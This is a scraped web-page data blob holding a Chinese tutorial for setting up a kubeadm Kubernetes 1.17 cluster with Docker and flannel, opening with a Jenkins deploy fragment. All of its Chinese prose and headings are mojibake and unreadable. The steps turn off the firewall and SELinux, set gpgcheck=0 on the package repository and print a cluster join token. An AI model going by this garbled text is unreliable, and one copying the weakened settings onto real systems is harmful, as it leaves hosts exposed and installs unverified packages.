[sshtransfer(cleanremote: false, excludes: \'\', execcommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes: false, patternseparator: \'[, ]+\', remotedirectory: \'\', remotedirectorysdf: false, removeprefix: \'\', sourcefiles: \'\')], usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n\n            }\n        }\n    }\n}\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n',charsets:{cjk:!0}},{title:"kubernetes(äº) éç¾¤ç¯å¢æ­å»º",frontmatter:{title:"kubernetes(äº) éç¾¤ç¯å¢æ­å»º",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/601",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/601.kubernetes(%E4%BA%8C)%20%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",relativePath:"01.è¿ç»´/60.Kubernetes/601.kubernetes(äº) éç¾¤ç¯å¢æ­å»º.md",key:"v-7d7d4816",path:"/kubernetes/601/",headers:[{level:2,title:"1 åç½®ç¥è¯ç¹",slug:"_1-åç½®ç¥è¯ç¹",normalizedTitle:"1 åç½®ç¥è¯ç¹",charIndex:2},{level:3,title:"1.2 å®è£æ¹å¼",slug:"_1-2-å®è£æ¹å¼",normalizedTitle:"1.2 å®è£æ¹å¼",charIndex:158},{level:3,title:"1.3 kubeadm é¨ç½²æ¹å¼ä»ç»",slug:"_1-3-kubeadm-é¨ç½²æ¹å¼ä»ç»",normalizedTitle:"1.3 kubeadm é¨ç½²æ¹å¼ä»ç»",charIndex:370},{level:3,title:"1.4 å®è£è¦æ±",slug:"_1-4-å®è£è¦æ±",normalizedTitle:"1.4 å®è£è¦æ±",charIndex:590},{level:3,title:"1.5 æç»ç®æ ",slug:"_1-5-æç»ç®æ ",normalizedTitle:"1.5 æç»ç®æ ",charIndex:770},{level:2,title:"2 å®è£é¨ç½²",slug:"_2-å®è£é¨ç½²",normalizedTitle:"2 å®è£é¨ç½²",charIndex:935},{level:3,title:"2.1 hostnameåè§£æ",slug:"_2-1-hostnameåè§£æ",normalizedTitle:"2.1 hostname åè§£æ",charIndex:1237},{level:3,title:"2.2 æ¶é´åæ­¥",slug:"_2-2-æ¶é´åæ­¥",normalizedTitle:"2.2 æ¶é´åæ­¥",charIndex:1537},{level:3,title:"2.3 ç¦ç¨iptables å firewalld æå¡",slug:"_2-3-ç¦ç¨iptables-å-firewalld-æå¡",normalizedTitle:"2.3 ç¦ç¨ iptables å firewalld æå¡",charIndex:1763},{level:3,title:"2.4 ç¦ç¨ selinux",slug:"_2-4-ç¦ç¨-selinux",normalizedTitle:"2.4 ç¦ç¨ selinux",charIndex:2048},{level:3,title:"2.5 ç¦swapç¨ååº",slug:"_2-5-ç¦swapç¨ååº",normalizedTitle:"2.5 ç¦ swap ç¨ååº",charIndex:2197},{level:3,title:"2.6 ä¿®æ¹linxuçåæ ¸åæ°",slug:"_2-6-ä¿®æ¹linxuçåæ ¸åæ°",normalizedTitle:"2.6 ä¿®æ¹ linxu çåæ ¸åæ°",charIndex:2526},{level:3,title:"2.7 éç½® ipvs",slug:"_2-7-éç½®-ipvs",normalizedTitle:"2.7 éç½® ipvs",charIndex:3153},{level:3,title:"2.8 docker å®è£",slug:"_2-8-docker-å®è£",normalizedTitle:"2.8 docker å®è£",charIndex:3786},{level:3,title:"2.9 å®è£kubernetesç»ä»¶",slug:"_2-9-å®è£kubernetesç»ä»¶",normalizedTitle:"2.9 å®è£ kubernetes ç»ä»¶",charIndex:4703},{level:3,title:"2.10 éç¾¤åå§å",slug:"_2-10-éç¾¤åå§å",normalizedTitle:"2.10 éç¾¤åå§å",charIndex:5281},{level:4,title:"åå¤éå",slug:"åå¤éå",normalizedTitle:"åå¤éå",charIndex:5295},{level:4,title:"åå§å",slug:"åå§å",normalizedTitle:"åå§å",charIndex:5288},{level:3,title:"2.11 å®è£ç½ç»æä»¶",slug:"_2-11-å®è£ç½ç»æä»¶",normalizedTitle:"2.11 å®è£ç½ç»æä»¶",charIndex:6784},{level:4,title:"master æä½",slug:"master-æä½",normalizedTitle:"master æä½",charIndex:6869},{level:2,title:"æå¡é¨ç½²",slug:"æå¡é¨ç½²",normalizedTitle:"æå¡é¨ç½²",charIndex:23743}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"1 åç½®ç¥è¯ç¹ 1.2 å®è£æ¹å¼ 1.3 kubeadm é¨ç½²æ¹å¼ä»ç» 1.4 å®è£è¦æ± 1.5 æç»ç®æ  2 å®è£é¨ç½² 2.1 hostnameåè§£æ 2.2 æ¶é´åæ­¥ 2.3 ç¦ç¨iptables å firewalld æå¡ 2.4 ç¦ç¨ selinux 2.5 ç¦swapç¨ååº 2.6 ä¿®æ¹linxuçåæ ¸åæ° 2.7 éç½® ipvs 2.8 docker å®è£ 2.9 å®è£kubernetesç»ä»¶ 2.10 éç¾¤åå§å åå¤éå åå§å 2.11 å®è£ç½ç»æä»¶ master æä½ æå¡é¨ç½²",content:'# 1 åç½®ç¥è¯ç¹\n\nKubernetes éç¾¤å¤§ä½ä¸åä¸ºä¸¤ç±»ï¼ä¸ä¸»å¤ä» å å¤ä¸»å¤ä»ã\n\n * ä¸ä¸»å¤ä»ï¼ä¸å° Mater èç¹åå¤å° Node èç¹ï¼æ­å»ºç®åï¼ä½æ¯ç±åæºæéé£é©ï¼éåç¨äºæµè¯ç¯å¢\n * å¤ä¸»å¤ä»ï¼å¤å° Master èç¹åå¤å° Node èç¹ï¼æ­å»ºéº»ç¦ï¼å®å¨æ§é«ï¼éç¨äºçäº§ç¯å¢ã\n\n\n\n\n# 1.2 å®è£æ¹å¼\n\nKubernetes å¤æå¤ç§é¨ç½²æ¹å¼ï¼ç®åä¸»æµçæ¹å¼ç± kubeadmãminikubeãäºè¿å¶å\n\n * minikubeï¼ä¸ä¸ªç¨äºå¿«éæ­å»ºåèç¹ kubernetes çå·¥å·\n * kubeadmï¼ä¸ä¸ªç¨å¿«éæ­å»º kubernetes éç¾¤çå·¥å·\n * äºè¿å¶åï¼ä»å®ç½ä¸è½½æ¯ä¸ªç»ä»¶çäºè¿å¶åï¼ä»¥æ­¤å»å®è£ï¼æ­¤æ¹å¼å¯¹äºçè§£ kubernetes ç»ä»¶æ´å ææ\n\n> æ°ææ¨è kubeadm\n\n\n# 1.3 kubeadm é¨ç½²æ¹å¼ä»ç»\n\nkubeadm æ¯å®æ¹ç¤¾åºæ¨åºçä¸ä¸ªç¨äºå¿«éé¨ç½² kubernetes éç¾¤çå·¥å·ï¼è¿ä¸ªå·¥å·è½éè¿ä¸¤æ¡æä»¤å®æä¸ä¸ª kubernetes éç¾¤çé¨ç½²ï¼\n\n * åå»ºä¸ä¸ª Master èç¹ kubeadm init\n * å° Node èç¹å å¥å°å½åéç¾¤ä¸­ $ kubeadm join <Master èç¹ç IP åç«¯å£>\n\n> kubeadm å®è£éç¾¤è¦æ± centos7.5 åä»¥ä¸\n\n\n# 1.4 å®è£è¦æ±\n\nå¨å¼å§ä¹åï¼é¨ç½² Kubernetes éç¾¤æºå¨éè¦æ»¡è¶³ä»¥ä¸å ä¸ªæ¡ä»¶ï¼\n\n * ä¸å°æå¤å°æºå¨ï¼æä½ç³»ç» CentOS7.x-86_x64\n * ç¡¬ä»¶éç½®ï¼2GB ææ´å¤ RAMï¼2 ä¸ª CPU ææ´å¤ CPUï¼ç¡¬ç 30GB ææ´å¤\n * éç¾¤ä¸­æææºå¨ä¹é´ç½ç»äºé\n * å¯ä»¥è®¿é®å¤ç½ï¼éè¦æåéå\n * ç¦æ­¢ swap ååº\n\n\n# 1.5 æç»ç®æ \n\n * å¨ææèç¹ä¸å®è£ Docker å kubeadm\n * é¨ç½² Kubernetes Master\n * é¨ç½²å®¹å¨ç½ç»æä»¶\n * é¨ç½² Kubernetes Nodeï¼å°èç¹å å¥ Kubernetes éç¾¤ä¸­\n * é¨ç½² Dashboard Web é¡µé¢ï¼å¯è§åæ¥ç Kubernetes èµæº\n\n\n# 2 å®è£é¨ç½²\n\n\n\nè§è²       HOSTNAME   IP               ç»ä»¶\nmaster   node101    192.168.81.101   dockerï¼kubectlï¼kubeadmï¼kubelet\nnode1    node102    192.168.81.102   dockerï¼kubectlï¼kubeadmï¼kubelet\nnode2    node103    192.168.81.103   dockerï¼kubectlï¼kubeadmï¼kubelet\n\n> ä»¥ä¸æ²¡æç¹å®è¯´æå¨ Master è¿æ¯ Node ä¸æä½ï¼é»è®¤å¨é¨èç¹éè¦æä½ã\n\n\n# 2.1 hostname åè§£æ\n\nä¸ç®¡æ­å»ºè®¾ä»ä¹éç¾¤ï¼åè®°è®¾ç½®å¥½ hostnameï¼æ¯è¾æ¹ä¾¿ãä¸¤ä¸ªæ­¥éª¤å®æè®¾ç½®ï¼\n\n 1. ä¸´æ¶è®¾ç½®ãhostname èç¹åç§°\n 2. vim /etc/hostname\n\nè®¾ç½®å®æåè¦æ·»å è§£æ hostname ä¸»æºåç IP æ å°ï¼vim /etc/hosts ç´æ¥ä¿®æ¹\n\n192.168.81.101  node101\n192.168.81.102  node102\n192.168.81.103  node103  \n\n\n1\n2\n3\n\n\nhostname node101\n\nvim /etc/hostname\nnode101\n\n\n1\n2\n3\n4\n\n\n\n# 2.2 æ¶é´åæ­¥\n\nKubernetes è¦æ±æ®ç¾¤ä¼çèç¹æ¶é´å¿é¡»ç²¾ç¡®ä¸è´ï¼è¿éç´æ¥ä½¿ç¨ chronyd æå¡ä»ç½ç»åæ­¥æ¶é´ãä¼ä¸ä¸­å»ºè®®éç½®åé¨çæ¶é´åæ­¥æå¡å¨ã\n\n# å¯å¨chronydæå¡\nsystemctl start chronyd\n# è®¾ç½®chronydæå¡å¼æºèªå¯å¨\nsystemctl enable chronyd\n# chronyd æå¡å¯å¨ç¨ç­å ç§éï¼å°±å¯ä»¥ä½¿ç¨dataå½ä»¤éªè¯æ¶é´äº\ndate\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.3 ç¦ç¨ iptables å firewalld æå¡\n\nKubernetes å docker å¨è¿è¡ä¸­ä¼äº§çå¤§éç iptables è§åï¼ä¸ºäºä¸è®©ç³»ç»è§åè·ä»ä»¬æ··æ·ï¼ç´æ¥å³é­ç³»ç»çè§åï¼çäº§ç³»ç»å»ºè®®å¼å¯ï¼éè¦å¼æ¾åªäºç«¯å£æè IPï¼æå¨éç½®ã\n\n# å³é­ firewalld æå¡\nsystemctl stop firewalld\nsystemctl disable firewalld\n# å³é­iptanlesæå¡\nsystemctl stop iptables\nsystemctl disable iptables\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.4 ç¦ç¨ selinux\n\nselinux æ¯ linux ç³»ç»ä¸çä¸ä¸ªå®å¨æå¡ï¼å¦æä¸å³é­å®ï¼å¨å®è£éç¾¤ä¸­å¯è½ä¼è¢«éå¶\n\n# ä¸´æ¶å³é­\nsetenforce 0\n# æ°¸ä¹ç¦ç¨\nvim /etc/selinux/config\nSELINUX=disabled\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.5 ç¦ swap ç¨ååº\n\nswap ååºæçæ¯èæåå­ååºï¼å®çä½ç¨æ¯å¨ç©çåå­ä½¿ç¨å®ä¹åï¼å°ç£çç©ºé´èææåå­æ¥ä½¿ç¨ï¼å¯ç¨ swap è®¾å¤ä¼å¯¹ç³»ç»çæ§è½äº§çéå¸¸è´é¢çå½±åï¼å æ­¤ Kubernetes è¦æ±æ¯ä¸ªèç¹é½è¦ç¦ç¨ swap è®¾å¤ï¼ä½æ¯å¦æå ä¸ºæäºåå ç¡®å®ä¸è½å³é­ swap ååºï¼å°±éè¦å¨éç¾¤å®è£çè¿ç¨ä¸­éè¿æç¡®çåæ°è¿è¡éç½®è¯´æã\n\n# ä¸´æ¶å³é­\nswapoff -a\n\n# æ°¸ä¹å³é­ï¼ç¼è¾ååºéç½®æä»¶ /etc/fstabï¼æ³¨éæ wap ååºä¸è¡\n#/dev/mapper/centos-swap swap                    swap    defaults        0 0\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.6 ä¿®æ¹ linxu çåæ ¸åæ°\n\n# ä¿®æ¹linuxçåæ ¸åæ°ï¼æ·»å ç½æ¡¥è¿æ»¤åå°åè½¬ååè½\n# ç¼è¾ /etc/sysctl.d/k8s.conf æä»¶ï¼æ·»å å¦ä¸éç½®ï¼\nnet.bridge.bridge-nf-call-iptables=1\nnet.bridge.bridge-nf-call-ip6tables=1\nnet.ipv4.ip_forward=1\nnet.ipv4.tcp_tw_recycle=0\nvm.swappiness=0\nvm.overcommit_memory=1\nvm.panic_on_oom=0\nfs.inotify.max_user_watches=89100\nfs.file-max=52706963\nfs.nr_open=52706963\nnet.ipv6.conf.all.disable_ipv6=1\nnet.netfilter.nf_conntrack_max=2310720\n\n# å è½½ç½æ¡¥è¿æ»¤æ¨¡å\nmodprobe br_netfilter\nmodprobe ip_conntrack\n# éç½®å®æåéæ°å è½½éç½®æä»¶\nsysctl -p /etc/sysctl.d/k8s.conf\n# æ¥çç½æ¡¥è¿æ»¤æ¨¡åæ¯å¦æ·»å æå\nlsmod | grep br_netfilter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.7 éç½® ipvs\n\nå¨ Kubernetes ä¸­ service æä¸¤ç§ä»£çæ¨¡åï¼ä¸ç§æ¯åºäº iptables çï¼ä¸ç§æ¯åºäº ipvs çï¼ä¸¤èæ¯è¾çè¯ï¼ipvs çæ§è½ææ¾æ´è¦é«ä¸äºï¼ä½æ¯å¦æè¦ä½¿ç¨å®ï¼éè¦æå¨è½½å¥ ipvs æ¨¡å\n\n# å®è£ ipset å ipvsadm \nyum install ipset ipvsadm -y\n\n# æ·»å éè¦å è½½å¾æ¨¡ååå¥èæ¬æä»¶\ncat <<EOF > /etc/sysconfig/modules/ipvs.modules\n#!/bin/bash\nmodprobe -- ip_vs\nmodprobe -- ip_vs_rr\nmodprobe -- ip_vs_wrr\nmodprobe -- ip_vs_sh\nmodprobe -- nf_conntrack_ipv4\nmodprobe -- br_netfilter\nEOF\n\n# ä¸ºèæ¬æä»¶æ·»å æ§è¡æé\nchmod +x /etc/sysconfig/modules/ipvs.modules\n\n# æ§è¡èæ¬æä»¶\n/bin/bash /etc/sysconfig/modules/ipvs.modules\n\n# æ¥çå¯¹åºå¾æ¨¡åæ¯å¦å è½½æå\nlsmod | grep -e ip_vs -e nf_conntrack_ipv4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.8 docker å®è£\n\n# ä¹åå®è£è¿docker å¸è½½\nyum remove docker-*\n\n# æ´æ¢éåå°å\nwget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo\n\n# æ£æ¥æ¯æçæ¬\nyum list docker-ce --showduplicates | sort -r\n\n# å®è£\nyum install --setopt=obsoletes=0 docker-ce-18.06.3.ce-3.el7\n\n# æ·»å ä¸ä¸ªéç½®æä»¶ï¼dockerå¨é»è®¤æåµä¸ä½¿ç¨çCgroup Driverä¸ºcgroupfsï¼èkubernetesæ¨èä½¿ç¨systemdæ¥ä»£æ¿cgroupfs\ncat > /etc/docker/daemon.json <<EOF\n{\n  "registry-mirrors": ["https://bk6kzfqm.mirror.aliyuncs.com"],\n  "data-root": "/data/docker",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "log-driver": "json-file",\n  "log-opts": {\n    "max-size": "100m"\n  },\n  "storage-driver": "overlay2",\n  "storage-opts": [\n    "overlay2.override_kernel_check=true"\n  ]\n}\nEOF\n\n# å¯å¨docker\nsystemctl restart docker\nsystemctl enable docker\n\n#æ£æ¥çæ¬\ndocker version\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 2.9 å®è£ kubernetes ç»ä»¶\n\nç±äº Kubernetes çéåæºå¨å½å¤ï¼éåº¦æ¯è¾æ¢ï¼è¿éåæ¢æå½åçéåæº\n\n# æ·»å éç½®æä»¶\nvim /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå®è£ kubeadmãkubelet å kubectl\n\nyum install --setopt=obsoletes=0 kubeadm-1.17.4-0 kubelet-1.17.4-0 kubectl-1.17.4-0\n\n\n1\n\n\nè®¾ç½® kubelet å¼æºèªå¯å¨\n\nsystemctl enable kubelet\n\n\n1\n\n\n\n# 2.10 éç¾¤åå§å\n\n# åå¤éå\n\nkubeadm config images list\n\nimages=(\n    kube-apiserver:v1.17.4\n    kube-controller-manager:v1.17.4\n    kube-scheduler:v1.17.4\n    kube-proxy:v1.17.4\n    pause:3.1\n    etcd:3.4.3-0\n    coredns:1.6.5\n)\n\n\nfor imageName in ${images[@]} ;do\n    docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName\n    docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName k8s.gcr.io/$imageName\n    docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName\ndone\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå§å\n\nå¨ Master ç¹æä½å¦ä¸\n\nkubeadm init \\\n  --kubernetes-version=v1.17.4 \\\n  --pod-network-cidr=10.244.0.0/16 \\\n  --service-cidr=10.96.0.0/12  \\\n  --apiserver-advertise-address=10.240.30.113\n\n\n1\n2\n3\n4\n5\n\n * kubernetes-version ä¸ºçæ¬\n * pod-network-cidr æå® pod ç½ç»\n * service-cidr æå® service ç½ç»\n * apiserver-advertise-address æå® master ç IP å°å\n * image-repository registry.aliyuncs.com/google_containers æå®éåæºä¸ºé¿éï¼åé¢å·²ç»æåè¿éåäºï¼æä»¥ä¸éè¦å¨æ\n\n# å®è£è¿ç¨ä¸­æ¥éå¦ææ¥éï¼æ¥çæ¥å¿\njournalctl -xfeu kubelet\n\n# éç½® kubeadm çä¿¡æ¯\nkubeadm reset\n\n\n1\n2\n3\n4\n5\n\n\nå¨ Master ç¹åå»ºå¿è¦çæä»¶ï¼æ¯ kubectl ä»¥åè¦æ§è¡çéç½®æä»¶\n\n  mkdir -p $HOME/.kube\n  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\n  sudo chown $(id -u):$(id -g) $HOME/.kube/config\n\n\n1\n2\n3\n\n\nå¶ä»å­èç¹æ§è¡ï¼å®è£æååä¼æä¿¡æ¯åè¯ä½ \n\nkubeadm join 192.168.81.101:6443 --token d5ejth.9s60snjt5xlh9lnt \\\n    --discovery-token-ca-cert-hash sha256:04aab4993001f66f607e959b120294eddcc8579a5ea7d7364f48d84caecc90c9\n\n\n1\n2\n\n\næ¥çææèç¹\n\nkubectl get nodes\n\n\n1\n\n\n\n# 2.11 å®è£ç½ç»æä»¶\n\nkubernetes æ¯æå¤ç§ç½ç»æä»¶ï¼æ¯å¦ flannelãcalicoãcanal ç­ç­ï¼ä»»éä¸ç§ä½¿ç¨å³å¯ï¼æ¬æ¬¡éæ© flannel\n\n# master æä½\n\nåå»ºæä»¶ï¼å¤å¶æ§åå®¹å°æä»¶ä¸­\n\ncat <<EOF > kube-flannel.yml\n---\napiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: psp.flannel.unprivileged\n  annotations:\n    seccomp.security.alpha.kubernetes.io/allowedProfileNames: docker/default\n    seccomp.security.alpha.kubernetes.io/defaultProfileName: docker/default\n    apparmor.security.beta.kubernetes.io/allowedProfileNames: runtime/default\n    apparmor.security.beta.kubernetes.io/defaultProfileName: runtime/default\nspec:\n  privileged: false\n  volumes:\n    - configMap\n    - secret\n    - emptyDir\n    - hostPath\n  allowedHostPaths:\n    - pathPrefix: "/etc/cni/net.d"\n    - pathPrefix: "/etc/kube-flannel"\n    - pathPrefix: "/run/flannel"\n  readOnlyRootFilesystem: false\n  # Users and groups\n  runAsUser:\n    rule: RunAsAny\n  supplementalGroups:\n    rule: RunAsAny\n  fsGroup:\n    rule: RunAsAny\n  # Privilege Escalation\n  allowPrivilegeEscalation: false\n  defaultAllowPrivilegeEscalation: false\n  # Capabilities\n  allowedCapabilities: [\'NET_ADMIN\']\n  defaultAddCapabilities: []\n  requiredDropCapabilities: []\n  # Host namespaces\n  hostPID: false\n  hostIPC: false\n  hostNetwork: true\n  hostPorts:\n  - min: 0\n    max: 65535\n  # SELinux\n  seLinux:\n    # SELinux is unused in CaaSP\n    rule: \'RunAsAny\'\n---\nkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nrules:\n  - apiGroups: [\'extensions\']\n    resources: [\'podsecuritypolicies\']\n    verbs: [\'use\']\n    resourceNames: [\'psp.flannel.unprivileged\']\n  - apiGroups:\n      - ""\n    resources:\n      - pods\n    verbs:\n      - get\n  - apiGroups:\n      - ""\n    resources:\n      - nodes\n    verbs:\n      - list\n      - watch\n  - apiGroups:\n      - ""\n    resources:\n      - nodes/status\n    verbs:\n      - patch\n---\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: flannel\nsubjects:\n- kind: ServiceAccount\n  name: flannel\n  namespace: kube-system\n---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: flannel\n  namespace: kube-system\n---\nkind: ConfigMap\napiVersion: v1\nmetadata:\n  name: kube-flannel-cfg\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\ndata:\n  cni-conf.json: |\n    {\n      "name": "cbr0",\n      "cniVersion": "0.3.1",\n      "plugins": [\n        {\n          "type": "flannel",\n          "delegate": {\n            "hairpinMode": true,\n            "isDefaultGateway": true\n          }\n        },\n        {\n          "type": "portmap",\n          "capabilities": {\n            "portMappings": true\n          }\n        }\n      ]\n    }\n  net-conf.json: |\n    {\n      "Network": "10.244.0.0/16",\n      "Backend": {\n        "Type": "vxlan"\n      }\n    }\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - amd64\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n            add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-arm64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - arm64\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-arm\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - arm\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-ppc64le\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - ppc64le\n      hostNetwork: true\n      tolerations:\n      - operator: 